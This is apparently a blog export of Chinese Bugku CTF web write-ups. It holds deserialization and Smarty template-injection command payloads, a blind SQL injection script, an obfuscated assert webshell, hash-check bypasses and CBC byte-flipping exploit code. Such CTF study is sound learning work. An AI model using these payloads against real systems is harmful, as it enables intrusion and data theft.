<h4 id="绕过wake-up函数"><a href="#绕过wake-up函数" class="headerlink" title="绕过wake up函数"></a>绕过wake up函数</h4><pre><code>?code=O:3:%22ctf%22:3:{s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;}</code></pre>
<p><img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugku：Web-安慰奖\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web-聪明的PHP</title>
    <url>/2021/04/16/bugku-web-cong-ming-de-php/</url>
    <content><![CDATA[<p>模板注入可以看这里：</p>
<p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
<p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP\1.png" alt="1"></p>
<p>传参试试：</p>
<p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP\传参.png" alt="传参"></p>
<p>审计代码可以发现，这就是一个smarty模板注入</p>
<pre><code>{{2*2}}</code></pre>
<p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP22.png" alt="22"></p>
<p>因为上传的时候会被过滤所以加了个“1”</p>
<p>看到执行了<br> 存在命令执行漏洞，过滤了不少函数，但看了一下，1passthru没有被过滤 这个函数可以代替system()</p>
<p>这时可以用1passthru相关的语句来构造payload：<br>我首先是先试了一下</p>
<pre><code>{{1passthru('tac /fl*')}}</code></pre>
<p>，发现没什么作用，接着试了</p>
<pre><code>{{1passthru('more /fl*')}}</code></pre>
<p>，同样没有效果，接着又试了</p>
<pre><code>{{1passthru('/?[a][t] /fl*')}}</code></pre>
<p>，还是不行，这时左想右想，突然想到题目的</p>
<pre><code>maybe the flag file’s filename is random</code></pre>
<p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugku：Web-聪明的PHP\flag.png" alt="flag"></p>
<p>除了用more，还可以用less，head，tail，nl，vim</p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web13-看看源代码</title>
    <url>/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/</url>
    <content><![CDATA[<p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugku：Web13-看看源代码\描述.png" alt="描述"></p>
<p>f12</p>
<p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugku：Web13-看看源代码\f12.png" alt="f12"></p>
<p>解码得</p>
<pre><code>function checkSubmit(){
  var a = document.getElementById("password");
  if("undefined"!=typeof a){
    if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;
    alert("Error");
    a.focus();
    return!1
    }
}document.getElementById("levelQuest").onsubmit = checkSubmit;</code></pre>
<p>发送67d709b2b54aa2aa648cf6e87a7114f1得到flag</p>
<pre><code>flag{6917495a0e17df3f54d72aaf72c64645}</code></pre>
<p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugku：Web13-看看源代码\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web18-秋名山司机</title>
    <url>/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/</url>
    <content><![CDATA[<p><img src="/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/bdaaaa4f138f0bda35a9995faec2961.png" alt="bdaaaa4f138f0bda35a9995faec2961"></p>
<p><img src="/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/5e0d83e24d8da06c267472732de8ed5.png" alt="5e0d83e24d8da06c267472732de8ed5"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web20-cookie欺骗</title>
    <url>/2021/04/03/bugku-web20-cookie-qi-pian/</url>
    <content><![CDATA[<pre><code>index.php?line=&amp;filename=a2V5cy50eHQ=</code></pre>
<p>修改line的值</p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=2.png" alt="line=2"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=3.png" alt="line=3"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=4.png" alt="line=4"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=5.png" alt="line=5"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=6.png" alt="line=6"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=7.png" alt="line=7"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=8.png" alt="line=8"></p>
<p><img src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=10.png" alt="line=10"></p>
<p>拼接以后：</p>
<pre><code>&lt;?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");
$file_list = array(
'0' =&gt;'keys.txt',
'1' =&gt;'index.php',
); 
if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}
if(in_array($file, $file_list)){ 
$fa = file($file);
echo $fa[$line];
}
?&gt;</code></pre>
<p>所以当cookie中</p>
<pre><code>margin=margin</code></pre>
<p>访问keys.txt</p>
<p>hacker伪造cookie</p>
<p>得到flag</p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web25-SQL约束攻击</title>
    <url>/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/</url>
    <content><![CDATA[<p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugku：web25-SQL约束攻击\admin.png" alt="admin"></p>
<p>用admin                                                  1</p>
<p>任意密码绕过注释‘</p>
<p>登录界面admin和前面注册用的密码得到flag</p>
<p>原因空格截断即长度限制</p>
<p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugku：web25-SQL约束攻击\flag.png" alt="flag"></p>
<p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugku：web25-SQL约束攻击\flag.png" alt="flag"></p>
<h2 id="防护"><a href="#防护" class="headerlink" title="防护:"></a>防护:</h2><p>毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：</p>
<ol>
<li>将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</li>
<li>最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪</li>
<li>为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</li>
</ol>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web22-过狗一句话</title>
    <url>/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/</url>
    <content><![CDATA[<h3 id="PHP-scandir-函数"><a href="#PHP-scandir-函数" class="headerlink" title="PHP scandir() 函数"></a>PHP scandir() 函数</h3><p>实例：</p>
<pre><code>&lt;?php
$dir = "/images/";

// Sort in ascending order - this is default
$a = scandir($dir);

// Sort in descending order
$b = scandir($dir,1);

print_r($a);
print_r($b);
?&gt;</code></pre>
<p>结果：</p>
<pre><code>Array
(
[0] =&gt; .
[1] =&gt; ..
[2] =&gt; cat.gif
[3] =&gt; dog.gif
[4] =&gt; horse.gif
[5] =&gt; myimages
)
Array
(
[0] =&gt; myimages
[1] =&gt; horse.gif
[2] =&gt; dog.gif
[3] =&gt; cat.gif
[4] =&gt; ..
[5] =&gt; .
) </code></pre>
<h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>scandir() 函数返回指定目录中的文件和目录的数组。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>scandir(*directory,sorting_order,context*);</code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>directory</em></td>
<td>必需。规定要扫描的目录。</td>
</tr>
<tr>
<td><em>sorting_order</em></td>
<td>可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项。</td>
</tr>
</tbody></table>
<h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>提示：</p>
<pre><code>&lt;?php 
$poc = "a#s#s#e#r#t";
$poc_1 = explode("#", $poc);
$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];
$poc_2($_GET['s'])
?&gt;</code></pre>
<p> exlpde()分割a#s#s#e#r#t为assert，使用assert()函数的解析传进来的s串，assert有代码执行漏洞。</p>
<pre><code>?s=print_r(scandir('./'))</code></pre>
<p><img src="/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/blog/source_posts\Bugku：Web22-过狗一句话\s.png" alt="s"></p>
<p>访问</p>
<p><img src="/2021/04/03/bugku-web22-guo-gou-yi-ju-hua/blog/source_posts\Bugku：Web22-过狗一句话\flaga15808abee46a1d5.txt.png" alt="flaga15808abee46a1d5.txt"></p>
<p>或者：</p>
<pre><code>?s=print_r(glob("*.*"))</code></pre>
<pre><code>?s=print_r(glob('*.txt'))</code></pre>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web24-PHP是世界上最好的语言</title>
    <url>/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/</url>
    <content><![CDATA[<p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugku：Web24-PHP是世界上最好的语言\访问.png" alt="访问"></p>
<p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugku：Web24-PHP是世界上最好的语言\f12.png" alt="f12"></p>
<p><img src="/2021/04/03/bugku-web24-php-shi-shi-jie-shang-zui-hao-de-yu-yan/blog/source_posts\Bugku：Web24-PHP是世界上最好的语言\code.png" alt="code"></p>
<pre><code>?v1[]=QNKCDZO&amp;v2[]=s878926199a&amp;v3[]=</code></pre>
<pre><code>?v1[]=aaa&amp;v2[]=aa&amp;v3[]=</code></pre>
<pre><code>?v1[]=1&amp;v2[]=2&amp;v3[]=</code></pre>
<pre><code>flag{5f9c370a78e9b4b4436825cb986784e4}</code></pre>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web29-各种绕过sha1</title>
    <url>/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/</url>
    <content><![CDATA[<h2 id="sha1与MD5区别："><a href="#sha1与MD5区别：" class="headerlink" title="sha1与MD5区别："></a>sha1与MD5区别：</h2><p>安全哈希算法（Secure Hash Algorithm）主要适用于数字签名标准（Digital Signature Standard  DSS）里面定义的数字签名算法（Digital Signature Algorithm  DSA）。对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要。该算法经过加密专家多年来的发展和改进已日益完善，并被广泛使用。该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。散列函数值可以说是对明文的一种“指纹”或是“摘要”所以对散列值的数字签名就可以视为对此明文的数字签名。单向散列函数的安全性在于其产生散列值的操作过程具有较强的单向性。如果在输入序列中嵌入密码，那么任何人在不知道密码的情况下都不能产生正确的散列值，从而保证了其安全性。SHA将输入流按照每块512位（64个字节）进行分块，并产生20个字节的被称为信息认证代码或信息摘要的输出。<br> 该算法输入报文的长度不限，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。<br>  通过散列算法可实现数字签名实现，数字签名的原理是将要传送的明文通过一种函数运算（Hash）转换成报文摘要（不同的明文对应不同的报文摘要），报文摘要加密后与明文一起传送给接受方，接受方将接受的明文产生新的报文摘要与发送方的发来报文摘要解密比较，比较结果一致表示明文未被改动，如果不一致表示明文已被篡改。<br> MAC （信息认证代码）就是一个散列结果，其中部分输入信息是密码，只有知道这个密码的参与者才能再次计算和验证MAC码的合法性。</p>
<p>SHA-1与MD5的比较<br> 因为二者均由MD4导出，SHA-1和MD5彼此很相似。相应的，他们的强度和其他特性也是相似，但还有以下几点不同：<br> l 对强行攻击的安全性：最显著和最重要的区别是SHA-1摘要比MD5摘要长32 位。使用强行技术，产生任何一个报文使其摘要等于给定报摘要的难度对MD5是2128数量级的操作，而对SHA-1则是2160数量级的操作。这样，SHA-1对强行攻击有更大的强度。<br> l 对密码分析的安全性：由于MD5的设计，易受密码分析的攻击，SHA-1显得不易受这样的攻击。<br> l 速度：在相同的硬件上，SHA-1的运行速度比MD5慢。</p>
<h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><p><img src="/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/blog/source_posts\Bugku：Web29-各种绕过sha1\源代码.png" alt="源代码"></p>
<p>只要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等</p>
<p>采用hackbar：</p>
<pre><code>?uname[]=1&amp;id=margin
post传值：passwd[]=2</code></pre>
<p><img src="/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/blog/source_posts\Bugku：Web29-各种绕过sha1\hackbar.png" alt="hackbar"></p>
<pre><code>flag{54f06835d645ab639ceb99e48a1a86da}</code></pre>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web33-解码</title>
    <url>/2021/04/09/bugku-web33-jie-ma/</url>
    <content><![CDATA[<pre><code>&lt;?php
function encrypt($data,$key)
{
    $key = md5('ISCC'); #729623334f0aa2784a1599fd374c120d
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i &lt; $len; $i++) { 
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i &lt; $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
    }
    return base64_encode($str);
}
?&gt;</code></pre>
<pre><code>描　　述: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</code></pre>
<p>需要对描述字符串解密，解密函数如下</p>
<pre><code>&lt;?php
function decrypt($str) {
    $mkey = "729623334f0aa2784a1599fd374c120d";
    $klen = strlen($mkey);
    $tmp = $str;
    $tmp = base64_decode($tmp);  // 对 base64 后的字符串 decode
    $md_len = strlen($tmp); //获取字符串长度
    $x = 0;
    $char = "";
    for($i=0;$i &lt; $md_len;$i++) {  //  取二次加密用 key;
        if ($x == $klen)  // 数据长度是否超过 key 长度检测
            $x = 0;
        $char .= $mkey[$x];  // 从 key 中取二次加密用 key
        $x+=1;
    }
    $md_data = array();
    for($i=0;$i&lt;$md_len;$i++) { // 取偏移后密文数据
        array_push($md_data, ord($tmp[$i]));
    }
    $md_data_source = array();
    $data1 = "";
    $data2 = "";
    foreach ($md_data as $key =&gt; $value) { // 对偏移后的密文数据进行还原
        $i = $key;
        if($i &gt;= strlen($mkey)) {$i = $i - strlen($mkey);}
        $dd = $value;
        $od = ord($mkey[$i]);
        array_push($md_data_source,$dd);
        $data1 .= chr(($dd+128)-$od);  // 第一种可能, 余数+128-key 为回归数
        $data2 .= chr($dd-$od);  // 第二种可能, 余数直接-key 为回归数
    }
    print "data1 =&gt; ".$data1."&lt;br&gt;\n";
    print "data2 =&gt; ".$data2."&lt;br&gt;\n";
}
$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";
decrypt($str);
?&gt;</code></pre>
<p><img src="/2021/04/09/bugku-web33-jie-ma/blog/source_posts\Bugku：Web33-解码\在线解码.png" alt="在线解码"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web36-各种过滤</title>
    <url>/2021/04/11/bugku-web36-ge-chong-guo-lu/</url>
    <content><![CDATA[<pre><code># -*- coding: utf-8 -*-
import requests

session = requests.Session()
url="http://114.67.246.176:12012/login.php"
flag=''
for i in range(1,250):
        left=32
        right=128
        mid=(left+right)//2
        while(left&lt;right):
                payload="admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))&gt;%s))^'1"%(i,mid)
                data = {'uname': payload, 'passwd': 'admin'}
                res = requests.post(url, data=data)
                if 'password' in res.text:
                        left=mid+1
                else:
                        right=mid
                mid=(left+right)//2
        if(mid==32 or mid==127):
                break
        flag=flag+chr(mid)
        print(flag)
</code></pre>
<p>猜测是md5，去解码得到<code>bugkuctf</code></p>
<pre><code>cat&lt;/flag</code></pre>
<pre><code>{cat,/flag}</code></pre>
<p><img src="/2021/04/11/bugku-web36-ge-chong-guo-lu/blog/source_posts\Bugku：Web36-各种过滤\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku:Web39-CBC字节翻转攻击</title>
    <url>/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/</url>
    <content><![CDATA[<h2 id="CBC字节翻转攻击的原理"><a href="#CBC字节翻转攻击的原理" class="headerlink" title="CBC字节翻转攻击的原理"></a>CBC字节翻转攻击的原理</h2><h5 id="CBC翻转攻击方法的精髓在于："><a href="#CBC翻转攻击方法的精髓在于：" class="headerlink" title="CBC翻转攻击方法的精髓在于："></a>CBC翻转攻击方法的精髓在于：</h5><p>通过损坏密文字节来改变明文字节。(注：借助CBC内部的模式)借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文)</p>
<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\1.png" alt="1"></p>
<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\2.png" alt="2"></p>
<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\3.png" alt="3"></p>
<h5 id="CBC字节翻转攻击的原理："><a href="#CBC字节翻转攻击的原理：" class="headerlink" title="CBC字节翻转攻击的原理："></a>CBC字节翻转攻击的原理：</h5><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\CBC加密.png" alt="CBC加密"></p>
<ul>
<li>Plaintext:明文</li>
<li>Ciphertext:密文</li>
<li>Initialization Vector(IV):初始化向量-用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文</li>
<li>Block Cipher Encryption:分组密码加密</li>
</ul>
<ol>
<li>明文1 XOR 初始化向量(IV)=&gt;加密密文1=&gt;密文1</li>
<li>明文2 XOR 加密密文1=&gt;加密密文2=&gt;密文2</li>
<li>明文3 XOR 加密密文2=&gt;加密密文3=&gt;密文3</li>
</ol>
<h5 id="在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。"><a href="#在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。" class="headerlink" title="在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。"></a>在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。</h5><h5 id="整个加密的过程简单说来就是-共加密三次-："><a href="#整个加密的过程简单说来就是-共加密三次-：" class="headerlink" title="整个加密的过程简单说来就是(共加密三次)："></a>整个加密的过程简单说来就是(共加密三次)：</h5><ol>
<li>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</li>
<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
<li>将IV和第一组明文异或。</li>
<li>用密钥对3中xor后产生的密文加密。</li>
<li>用4中产生的密文对第二组明文进行xor操作。</li>
<li>用密钥对5中产生的密文加密。</li>
<li>重复4-7，到最后一组明文。</li>
<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
</ol>
<p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：前一块的密文用来产生后一块的密文。</p>
<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\CBC解密.png" alt="CBC解密"></p>
<ul>
<li>Decryption:解密</li>
</ul>
<h5 id="CBC解密的重点在于-前一段密文参与下一段密文的还原"><a href="#CBC解密的重点在于-前一段密文参与下一段密文的还原" class="headerlink" title="CBC解密的重点在于:前一段密文参与下一段密文的还原:"></a>CBC解密的重点在于:前一段密文参与下一段密文的还原:</h5><ol>
<li>从密文中提取出IV，然后将密文分组。</li>
<li>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</li>
<li>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</li>
<li>重复2-3，直到最后一组密文。</li>
</ol>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\CBC攻击.png" alt="CBC攻击"></p>
<ul>
<li>Flipped ciphertext bits:翻转密文位</li>
<li>Garbled decryption:乱码解密</li>
<li>Flipped plaintext bits:翻转明文位</li>
</ul>
<ol>
<li>密文1=&gt;解密密文1=&gt;解密密文1 XOR 初始化向量(iv) = 明文1</li>
<li>密文2=&gt;解密密文2=&gt;解密密文2 XOR 密文1 = 明文2</li>
<li>密文3=&gt;解密密文3=&gt;解密密文3 XOR 密文2 = 明文3</li>
</ol>
<p>我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器</p>
<blockquote>
<p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">A</th>
<th align="center">B</th>
<th align="center">C</th>
<th align="center">A⊕B⊕C</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
</tbody></table>
<h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><p>御剑扫描后台发现.index.php.swp</p>
<p>由于windows打不开文件所以采用网上的了:</p>
<pre><code>&lt;?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();

function get_random_iv(){    //随机生成16位初始化向量
    $random_iv='';
    for($i=0;$i&lt;16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

#第一个执行的方法
function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);    //明文序列化
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    //加密
    //options：以下标记的按位或： OPENSSL_RAW_DATA 原生数据，对应数字1，不进行 base64 编码。OPENSSL_ZERO_PADDING 数据进行 base64 编码再返回，对应数字0。 
    $_SESSION['username'] = $info['username'];    //注册SESSION全局变量
    //以下两行设置cookie
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}

function check_login(){
    if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}

#第二个执行，检测用户名为admin时，打印flag
function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo '&lt;p&gt;Hello admin&lt;/p&gt;';
        echo '&lt;p&gt;Flag is $flag&lt;/p&gt;';
    }else{
        echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;';
        echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;';
    }
    echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';
}

if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;');
    }else{
        $info = array('username'=&gt;$username,'password'=&gt;$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '&lt;body class="login-body"&gt;
                &lt;div id="wrapper"&gt;
                    &lt;div class="user-icon"&gt;&lt;/div&gt;
                    &lt;div class="pass-icon"&gt;&lt;/div&gt;
                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;
                        &lt;div class="header"&gt;
                        &lt;h1&gt;Login Form&lt;/h1&gt;
                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;
                        &lt;/div&gt;
                        &lt;div class="content"&gt;
                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;
                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;
                        &lt;/div&gt;</code></pre>
<p>POST参数(username,password)，并且禁止admin登陆。当用户名不是admin的时候，首先把用户名密码放入数组，传到login方法中。<br>login方法对传入的数组进行了序列化，并且使用aes-128-cbc对序列化进行加密。iv(初始化向量)是随机生成的。最终把cipher和iv放入cookie。<br>再到show_homepage()方法，检测$<em>SESSION中的username是admin时，打印flag。否则提示Only admin can see flag</em></p>
<p>然后审计else的下半部分，这里是上半部分操作执行过后，存在$_SESSION[‘username’]时执行。当不存在POST数据或者$_SESSION[‘username’]时，显示登陆页面。<br>有$_SESSION[‘username’]时，进入check_login()方法。<br>当cookie中存在cipher、iv时，对cipher进行解密。这里是解题的关键，可以通过修改cookie中的cipher值，将序列化数据的用户名修改成admin。从而绕过程序起点处禁止admin登陆的判断。</p>
<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><ol>
<li>send to repeater以后go</li>
<li>删除post内容</li>
<li>将cipher的值代入程序</li>
</ol>
<pre><code>&lt;?php
header("Content-Type: text/html;charset=utf-8");
    $cipher = base64_decode(urldecode('1bwcTEFquw2kLy3UGhW3OOw%2Bkof9%2BjH2XhiKvkVuzqmndIOd9fBXLB82Q3hbM7LCx8ySoty36X8pOIOylkSkkg%3D%3D'));
    $temp = $cipher;
    $cipher[13] = chr(ord($cipher[13]) ^ ord('l') ^ ord('n'));
    echo urlencode(base64_encode($cipher));
    ?&gt;</code></pre>
<ol start="4">
<li><p>替换cookies里的cipher</p>
<p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugku：Web39-CBC字节翻转攻击\base64解码.png" alt="base64解码"></p>
<p>base64解码以后可以看到admil已经替换成admin</p>
</li>
<li><p>回显base64和iv代入程序</p>
</li>
</ol>
<pre><code>&lt;?php
    $res = base64_decode('xaJllZwcE1Rh7Z0ieT8WV21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==');    //这里放burp放回的base64数据
    $iv = base64_decode(urldecode('FIbK%2FCXr43MhcD7KRPnlaA%3D%3D')); 
    $plaintext = 'a:2:{s:8:"userna';
    $new_iv = '';
    for ($i = 0; $i &lt; 16; $i ++){
        $new_iv = $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i]));
    }
    echo urlencode(base64_encode($new_iv));
?&gt;</code></pre>
